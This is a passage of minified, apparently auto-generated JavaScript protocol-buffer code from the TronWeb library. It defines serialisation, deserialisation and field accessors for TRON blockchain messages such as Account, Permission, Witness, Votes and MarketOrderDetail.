            return this.getFreeAssetNetUsagev2Map().clear(),
            this
        }
        ,
        TronWebProto.Account.prototype.getLatestConsumeTime = function() {
            return e.Message.getFieldWithDefault(this, 21, 0)
        }
        ,
        TronWebProto.Account.prototype.setLatestConsumeTime = function(n) {
            return e.Message.setProto3IntField(this, 21, n)
        }
        ,
        TronWebProto.Account.prototype.getLatestConsumeFreeTime = function() {
            return e.Message.getFieldWithDefault(this, 22, 0)
        }
        ,
        TronWebProto.Account.prototype.setLatestConsumeFreeTime = function(n) {
            return e.Message.setProto3IntField(this, 22, n)
        }
        ,
        TronWebProto.Account.prototype.getAccountId = function() {
            return e.Message.getFieldWithDefault(this, 23, "")
        }
        ,
        TronWebProto.Account.prototype.getAccountId_asB64 = function() {
            return e.Message.bytesAsB64(this.getAccountId())
        }
        ,
        TronWebProto.Account.prototype.getAccountId_asU8 = function() {
            return e.Message.bytesAsU8(this.getAccountId())
        }
        ,
        TronWebProto.Account.prototype.setAccountId = function(n) {
            return e.Message.setProto3BytesField(this, 23, n)
        }
        ,
        TronWebProto.Account.prototype.getAccountResource = function() {
            return e.Message.getWrapperField(this, TronWebProto.Account.AccountResource, 26)
        }
        ,
        TronWebProto.Account.prototype.setAccountResource = function(n) {
            return e.Message.setWrapperField(this, 26, n)
        }
        ,
        TronWebProto.Account.prototype.clearAccountResource = function() {
            return this.setAccountResource(void 0)
        }
        ,
        TronWebProto.Account.prototype.hasAccountResource = function() {
            return e.Message.getField(this, 26) != null
        }
        ,
        TronWebProto.Account.prototype.getCodehash = function() {
            return e.Message.getFieldWithDefault(this, 30, "")
        }
        ,
        TronWebProto.Account.prototype.getCodehash_asB64 = function() {
            return e.Message.bytesAsB64(this.getCodehash())
        }
        ,
        TronWebProto.Account.prototype.getCodehash_asU8 = function() {
            return e.Message.bytesAsU8(this.getCodehash())
        }
        ,
        TronWebProto.Account.prototype.setCodehash = function(n) {
            return e.Message.setProto3BytesField(this, 30, n)
        }
        ,
        TronWebProto.Account.prototype.getOwnerPermission = function() {
            return e.Message.getWrapperField(this, TronWebProto.Permission, 31)
        }
        ,
        TronWebProto.Account.prototype.setOwnerPermission = function(n) {
            return e.Message.setWrapperField(this, 31, n)
        }
        ,
        TronWebProto.Account.prototype.clearOwnerPermission = function() {
            return this.setOwnerPermission(void 0)
        }
        ,
        TronWebProto.Account.prototype.hasOwnerPermission = function() {
            return e.Message.getField(this, 31) != null
        }
        ,
        TronWebProto.Account.prototype.getWitnessPermission = function() {
            return e.Message.getWrapperField(this, TronWebProto.Permission, 32)
        }
        ,
        TronWebProto.Account.prototype.setWitnessPermission = function(n) {
            return e.Message.setWrapperField(this, 32, n)
        }
        ,
        TronWebProto.Account.prototype.clearWitnessPermission = function() {
            return this.setWitnessPermission(void 0)
        }
        ,
        TronWebProto.Account.prototype.hasWitnessPermission = function() {
            return e.Message.getField(this, 32) != null
        }
        ,
        TronWebProto.Account.prototype.getActivePermissionList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.Permission, 33)
        }
        ,
        TronWebProto.Account.prototype.setActivePermissionList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 33, n)
        }
        ,
        TronWebProto.Account.prototype.addActivePermission = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 33, n, TronWebProto.Permission, s)
        }
        ,
        TronWebProto.Account.prototype.clearActivePermissionList = function() {
            return this.setActivePermissionList([])
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Key.prototype.toObject = function(n) {
            return TronWebProto.Key.toObject(n, this)
        }
        ,
        TronWebProto.Key.toObject = function(n, s) {
            var a = {
                address: s.getAddress_asB64(),
                weight: e.Message.getFieldWithDefault(s, 2, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.Key.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Key;
            return TronWebProto.Key.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Key.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setAddress(l);
                    break;
                case 2:
                    var l = s.readInt64();
                    n.setWeight(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Key.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Key.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Key.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getWeight(),
            a !== 0 && s.writeInt64(2, a)
        }
        ,
        TronWebProto.Key.prototype.getAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.Key.prototype.getAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getAddress())
        }
        ,
        TronWebProto.Key.prototype.getAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getAddress())
        }
        ,
        TronWebProto.Key.prototype.setAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.Key.prototype.getWeight = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.Key.prototype.setWeight = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.DelegatedResource.prototype.toObject = function(n) {
            return TronWebProto.DelegatedResource.toObject(n, this)
        }
        ,
        TronWebProto.DelegatedResource.toObject = function(n, s) {
            var a = {
                from: s.getFrom_asB64(),
                to: s.getTo_asB64(),
                frozenBalanceForBandwidth: e.Message.getFieldWithDefault(s, 3, 0),
                frozenBalanceForEnergy: e.Message.getFieldWithDefault(s, 4, 0),
                expireTimeForBandwidth: e.Message.getFieldWithDefault(s, 5, 0),
                expireTimeForEnergy: e.Message.getFieldWithDefault(s, 6, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.DelegatedResource.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.DelegatedResource;
            return TronWebProto.DelegatedResource.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.DelegatedResource.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setFrom(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setTo(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setFrozenBalanceForBandwidth(l);
                    break;
                case 4:
                    var l = s.readInt64();
                    n.setFrozenBalanceForEnergy(l);
                    break;
                case 5:
                    var l = s.readInt64();
                    n.setExpireTimeForBandwidth(l);
                    break;
                case 6:
                    var l = s.readInt64();
                    n.setExpireTimeForEnergy(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.DelegatedResource.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.DelegatedResource.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.DelegatedResource.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getFrom_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getTo_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getFrozenBalanceForBandwidth(),
            a !== 0 && s.writeInt64(3, a),
            a = n.getFrozenBalanceForEnergy(),
            a !== 0 && s.writeInt64(4, a),
            a = n.getExpireTimeForBandwidth(),
            a !== 0 && s.writeInt64(5, a),
            a = n.getExpireTimeForEnergy(),
            a !== 0 && s.writeInt64(6, a)
        }
        ,
        TronWebProto.DelegatedResource.prototype.getFrom = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.DelegatedResource.prototype.getFrom_asB64 = function() {
            return e.Message.bytesAsB64(this.getFrom())
        }
        ,
        TronWebProto.DelegatedResource.prototype.getFrom_asU8 = function() {
            return e.Message.bytesAsU8(this.getFrom())
        }
        ,
        TronWebProto.DelegatedResource.prototype.setFrom = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.DelegatedResource.prototype.getTo = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.DelegatedResource.prototype.getTo_asB64 = function() {
            return e.Message.bytesAsB64(this.getTo())
        }
        ,
        TronWebProto.DelegatedResource.prototype.getTo_asU8 = function() {
            return e.Message.bytesAsU8(this.getTo())
        }
        ,
        TronWebProto.DelegatedResource.prototype.setTo = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.DelegatedResource.prototype.getFrozenBalanceForBandwidth = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.DelegatedResource.prototype.setFrozenBalanceForBandwidth = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.DelegatedResource.prototype.getFrozenBalanceForEnergy = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.DelegatedResource.prototype.setFrozenBalanceForEnergy = function(n) {
            return e.Message.setProto3IntField(this, 4, n)
        }
        ,
        TronWebProto.DelegatedResource.prototype.getExpireTimeForBandwidth = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.DelegatedResource.prototype.setExpireTimeForBandwidth = function(n) {
            return e.Message.setProto3IntField(this, 5, n)
        }
        ,
        TronWebProto.DelegatedResource.prototype.getExpireTimeForEnergy = function() {
            return e.Message.getFieldWithDefault(this, 6, 0)
        }
        ,
        TronWebProto.DelegatedResource.prototype.setExpireTimeForEnergy = function(n) {
            return e.Message.setProto3IntField(this, 6, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.authority.prototype.toObject = function(n) {
            return TronWebProto.authority.toObject(n, this)
        }
        ,
        TronWebProto.authority.toObject = function(n, s) {
            var a, l = {
                account: (a = s.getAccount()) && TronWebProto.AccountId.toObject(n, a),
                permissionName: s.getPermissionName_asB64()
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.authority.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.authority;
            return TronWebProto.authority.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.authority.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = new TronWebProto.AccountId;
                    s.readMessage(l, TronWebProto.AccountId.deserializeBinaryFromReader),
                    n.setAccount(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setPermissionName(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.authority.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.authority.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.authority.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getAccount(),
            a != null && s.writeMessage(1, a, TronWebProto.AccountId.serializeBinaryToWriter),
            a = n.getPermissionName_asU8(),
            a.length > 0 && s.writeBytes(2, a)
        }
        ,
        TronWebProto.authority.prototype.getAccount = function() {
            return e.Message.getWrapperField(this, TronWebProto.AccountId, 1)
        }
        ,
        TronWebProto.authority.prototype.setAccount = function(n) {
            return e.Message.setWrapperField(this, 1, n)
        }
        ,
        TronWebProto.authority.prototype.clearAccount = function() {
            return this.setAccount(void 0)
        }
        ,
        TronWebProto.authority.prototype.hasAccount = function() {
            return e.Message.getField(this, 1) != null
        }
        ,
        TronWebProto.authority.prototype.getPermissionName = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.authority.prototype.getPermissionName_asB64 = function() {
            return e.Message.bytesAsB64(this.getPermissionName())
        }
        ,
        TronWebProto.authority.prototype.getPermissionName_asU8 = function() {
            return e.Message.bytesAsU8(this.getPermissionName())
        }
        ,
        TronWebProto.authority.prototype.setPermissionName = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.Permission.repeatedFields_ = [7],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Permission.prototype.toObject = function(n) {
            return TronWebProto.Permission.toObject(n, this)
        }
        ,
        TronWebProto.Permission.toObject = function(n, s) {
            var a = {
                type: e.Message.getFieldWithDefault(s, 1, 0),
                id: e.Message.getFieldWithDefault(s, 2, 0),
                permissionName: e.Message.getFieldWithDefault(s, 3, ""),
                threshold: e.Message.getFieldWithDefault(s, 4, 0),
                parentId: e.Message.getFieldWithDefault(s, 5, 0),
                operations: s.getOperations_asB64(),
                keysList: e.Message.toObjectList(s.getKeysList(), TronWebProto.Key.toObject, n)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.Permission.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Permission;
            return TronWebProto.Permission.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Permission.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readEnum();
                    n.setType(l);
                    break;
                case 2:
                    var l = s.readInt32();
                    n.setId(l);
                    break;
                case 3:
                    var l = s.readString();
                    n.setPermissionName(l);
                    break;
                case 4:
                    var l = s.readInt64();
                    n.setThreshold(l);
                    break;
                case 5:
                    var l = s.readInt32();
                    n.setParentId(l);
                    break;
                case 6:
                    var l = s.readBytes();
                    n.setOperations(l);
                    break;
                case 7:
                    var l = new TronWebProto.Key;
                    s.readMessage(l, TronWebProto.Key.deserializeBinaryFromReader),
                    n.addKeys(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Permission.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Permission.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Permission.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getType(),
            a !== 0 && s.writeEnum(1, a),
            a = n.getId(),
            a !== 0 && s.writeInt32(2, a),
            a = n.getPermissionName(),
            a.length > 0 && s.writeString(3, a),
            a = n.getThreshold(),
            a !== 0 && s.writeInt64(4, a),
            a = n.getParentId(),
            a !== 0 && s.writeInt32(5, a),
            a = n.getOperations_asU8(),
            a.length > 0 && s.writeBytes(6, a),
            a = n.getKeysList(),
            a.length > 0 && s.writeRepeatedMessage(7, a, TronWebProto.Key.serializeBinaryToWriter)
        }
        ,
        TronWebProto.Permission.PermissionType = {
            OWNER: 0,
            WITNESS: 1,
            ACTIVE: 2
        },
        TronWebProto.Permission.prototype.getType = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.Permission.prototype.setType = function(n) {
            return e.Message.setProto3EnumField(this, 1, n)
        }
        ,
        TronWebProto.Permission.prototype.getId = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.Permission.prototype.setId = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        TronWebProto.Permission.prototype.getPermissionName = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.Permission.prototype.setPermissionName = function(n) {
            return e.Message.setProto3StringField(this, 3, n)
        }
        ,
        TronWebProto.Permission.prototype.getThreshold = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.Permission.prototype.setThreshold = function(n) {
            return e.Message.setProto3IntField(this, 4, n)
        }
        ,
        TronWebProto.Permission.prototype.getParentId = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.Permission.prototype.setParentId = function(n) {
            return e.Message.setProto3IntField(this, 5, n)
        }
        ,
        TronWebProto.Permission.prototype.getOperations = function() {
            return e.Message.getFieldWithDefault(this, 6, "")
        }
        ,
        TronWebProto.Permission.prototype.getOperations_asB64 = function() {
            return e.Message.bytesAsB64(this.getOperations())
        }
        ,
        TronWebProto.Permission.prototype.getOperations_asU8 = function() {
            return e.Message.bytesAsU8(this.getOperations())
        }
        ,
        TronWebProto.Permission.prototype.setOperations = function(n) {
            return e.Message.setProto3BytesField(this, 6, n)
        }
        ,
        TronWebProto.Permission.prototype.getKeysList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.Key, 7)
        }
        ,
        TronWebProto.Permission.prototype.setKeysList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 7, n)
        }
        ,
        TronWebProto.Permission.prototype.addKeys = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 7, n, TronWebProto.Key, s)
        }
        ,
        TronWebProto.Permission.prototype.clearKeysList = function() {
            return this.setKeysList([])
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Witness.prototype.toObject = function(n) {
            return TronWebProto.Witness.toObject(n, this)
        }
        ,
        TronWebProto.Witness.toObject = function(n, s) {
            var a = {
                address: s.getAddress_asB64(),
                votecount: e.Message.getFieldWithDefault(s, 2, 0),
                pubkey: s.getPubkey_asB64(),
                url: e.Message.getFieldWithDefault(s, 4, ""),
                totalproduced: e.Message.getFieldWithDefault(s, 5, 0),
                totalmissed: e.Message.getFieldWithDefault(s, 6, 0),
                latestblocknum: e.Message.getFieldWithDefault(s, 7, 0),
                latestslotnum: e.Message.getFieldWithDefault(s, 8, 0),
                isjobs: e.Message.getBooleanFieldWithDefault(s, 9, !1)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.Witness.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Witness;
            return TronWebProto.Witness.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Witness.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setAddress(l);
                    break;
                case 2:
                    var l = s.readInt64();
                    n.setVotecount(l);
                    break;
                case 3:
                    var l = s.readBytes();
                    n.setPubkey(l);
                    break;
                case 4:
                    var l = s.readString();
                    n.setUrl(l);
                    break;
                case 5:
                    var l = s.readInt64();
                    n.setTotalproduced(l);
                    break;
                case 6:
                    var l = s.readInt64();
                    n.setTotalmissed(l);
                    break;
                case 7:
                    var l = s.readInt64();
                    n.setLatestblocknum(l);
                    break;
                case 8:
                    var l = s.readInt64();
                    n.setLatestslotnum(l);
                    break;
                case 9:
                    var l = s.readBool();
                    n.setIsjobs(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Witness.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Witness.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Witness.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getVotecount(),
            a !== 0 && s.writeInt64(2, a),
            a = n.getPubkey_asU8(),
            a.length > 0 && s.writeBytes(3, a),
            a = n.getUrl(),
            a.length > 0 && s.writeString(4, a),
            a = n.getTotalproduced(),
            a !== 0 && s.writeInt64(5, a),
            a = n.getTotalmissed(),
            a !== 0 && s.writeInt64(6, a),
            a = n.getLatestblocknum(),
            a !== 0 && s.writeInt64(7, a),
            a = n.getLatestslotnum(),
            a !== 0 && s.writeInt64(8, a),
            a = n.getIsjobs(),
            a && s.writeBool(9, a)
        }
        ,
        TronWebProto.Witness.prototype.getAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.Witness.prototype.getAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getAddress())
        }
        ,
        TronWebProto.Witness.prototype.getAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getAddress())
        }
        ,
        TronWebProto.Witness.prototype.setAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.Witness.prototype.getVotecount = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.Witness.prototype.setVotecount = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        TronWebProto.Witness.prototype.getPubkey = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.Witness.prototype.getPubkey_asB64 = function() {
            return e.Message.bytesAsB64(this.getPubkey())
        }
        ,
        TronWebProto.Witness.prototype.getPubkey_asU8 = function() {
            return e.Message.bytesAsU8(this.getPubkey())
        }
        ,
        TronWebProto.Witness.prototype.setPubkey = function(n) {
            return e.Message.setProto3BytesField(this, 3, n)
        }
        ,
        TronWebProto.Witness.prototype.getUrl = function() {
            return e.Message.getFieldWithDefault(this, 4, "")
        }
        ,
        TronWebProto.Witness.prototype.setUrl = function(n) {
            return e.Message.setProto3StringField(this, 4, n)
        }
        ,
        TronWebProto.Witness.prototype.getTotalproduced = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.Witness.prototype.setTotalproduced = function(n) {
            return e.Message.setProto3IntField(this, 5, n)
        }
        ,
        TronWebProto.Witness.prototype.getTotalmissed = function() {
            return e.Message.getFieldWithDefault(this, 6, 0)
        }
        ,
        TronWebProto.Witness.prototype.setTotalmissed = function(n) {
            return e.Message.setProto3IntField(this, 6, n)
        }
        ,
        TronWebProto.Witness.prototype.getLatestblocknum = function() {
            return e.Message.getFieldWithDefault(this, 7, 0)
        }
        ,
        TronWebProto.Witness.prototype.setLatestblocknum = function(n) {
            return e.Message.setProto3IntField(this, 7, n)
        }
        ,
        TronWebProto.Witness.prototype.getLatestslotnum = function() {
            return e.Message.getFieldWithDefault(this, 8, 0)
        }
        ,
        TronWebProto.Witness.prototype.setLatestslotnum = function(n) {
            return e.Message.setProto3IntField(this, 8, n)
        }
        ,
        TronWebProto.Witness.prototype.getIsjobs = function() {
            return e.Message.getBooleanFieldWithDefault(this, 9, !1)
        }
        ,
        TronWebProto.Witness.prototype.setIsjobs = function(n) {
            return e.Message.setProto3BooleanField(this, 9, n)
        }
        ,
        TronWebProto.Votes.repeatedFields_ = [2, 3],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Votes.prototype.toObject = function(n) {
            return TronWebProto.Votes.toObject(n, this)
        }
        ,
        TronWebProto.Votes.toObject = function(n, s) {
            var a = {
                address: s.getAddress_asB64(),
                oldVotesList: e.Message.toObjectList(s.getOldVotesList(), TronWebProto.Vote.toObject, n),
                newVotesList: e.Message.toObjectList(s.getNewVotesList(), TronWebProto.Vote.toObject, n)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.Votes.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Votes;
            return TronWebProto.Votes.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Votes.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setAddress(l);
                    break;
                case 2:
                    var l = new TronWebProto.Vote;
                    s.readMessage(l, TronWebProto.Vote.deserializeBinaryFromReader),
                    n.addOldVotes(l);
                    break;
                case 3:
                    var l = new TronWebProto.Vote;
                    s.readMessage(l, TronWebProto.Vote.deserializeBinaryFromReader),
                    n.addNewVotes(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Votes.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Votes.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Votes.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getOldVotesList(),
            a.length > 0 && s.writeRepeatedMessage(2, a, TronWebProto.Vote.serializeBinaryToWriter),
            a = n.getNewVotesList(),
            a.length > 0 && s.writeRepeatedMessage(3, a, TronWebProto.Vote.serializeBinaryToWriter)
        }
        ,
        TronWebProto.Votes.prototype.getAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.Votes.prototype.getAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getAddress())
        }
        ,
        TronWebProto.Votes.prototype.getAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getAddress())
        }
        ,
        TronWebProto.Votes.prototype.setAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.Votes.prototype.getOldVotesList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.Vote, 2)
        }
        ,
        TronWebProto.Votes.prototype.setOldVotesList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 2, n)
        }
        ,
        TronWebProto.Votes.prototype.addOldVotes = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 2, n, TronWebProto.Vote, s)
        }
        ,
        TronWebProto.Votes.prototype.clearOldVotesList = function() {
            return this.setOldVotesList([])
        }
        ,
        TronWebProto.Votes.prototype.getNewVotesList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.Vote, 3)
        }
        ,
        TronWebProto.Votes.prototype.setNewVotesList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 3, n)
        }
        ,
        TronWebProto.Votes.prototype.addNewVotes = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 3, n, TronWebProto.Vote, s)
        }
        ,
        TronWebProto.Votes.prototype.clearNewVotesList = function() {
            return this.setNewVotesList([])
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.MarketOrderDetail.prototype.toObject = function(n) {
            return TronWebProto.MarketOrderDetail.toObject(n, this)
        }
        ,
        TronWebProto.MarketOrderDetail.toObject = function(n, s) {
            var a = {
                makerorderid: s.getMakerorderid_asB64(),
                takerorderid: s.getTakerorderid_asB64(),
                fillsellquantity: e.Message.getFieldWithDefault(s, 3, 0),
                fillbuyquantity: e.Message.getFieldWithDefault(s, 4, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.MarketOrderDetail.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.MarketOrderDetail;
            return TronWebProto.MarketOrderDetail.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.MarketOrderDetail.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setMakerorderid(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setTakerorderid(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setFillsellquantity(l);
                    break;
                case 4:
                    var l = s.readInt64();
                    n.setFillbuyquantity(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.MarketOrderDetail.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.MarketOrderDetail.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getMakerorderid_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getTakerorderid_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getFillsellquantity(),
            a !== 0 && s.writeInt64(3, a),
            a = n.getFillbuyquantity(),
            a !== 0 && s.writeInt64(4, a)
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.getMakerorderid = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.getMakerorderid_asB64 = function() {
            return e.Message.bytesAsB64(this.getMakerorderid())
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.getMakerorderid_asU8 = function() {
            return e.Message.bytesAsU8(this.getMakerorderid())
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.setMakerorderid = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.getTakerorderid = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.getTakerorderid_asB64 = function() {
            return e.Message.bytesAsB64(this.getTakerorderid())
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.getTakerorderid_asU8 = function() {
            return e.Message.bytesAsU8(this.getTakerorderid())
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.setTakerorderid = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.getFillsellquantity = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.setFillsellquantity = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.getFillbuyquantity = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.MarketOrderDetail.prototype.setFillbuyquantity = function(n) {
            return e.Message.setProto3IntField(this, 4, n)
        }
        ,
        TronWebProto.Transaction.repeatedFields_ = [2, 5],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Transaction.prototype.toObject = function(n) {
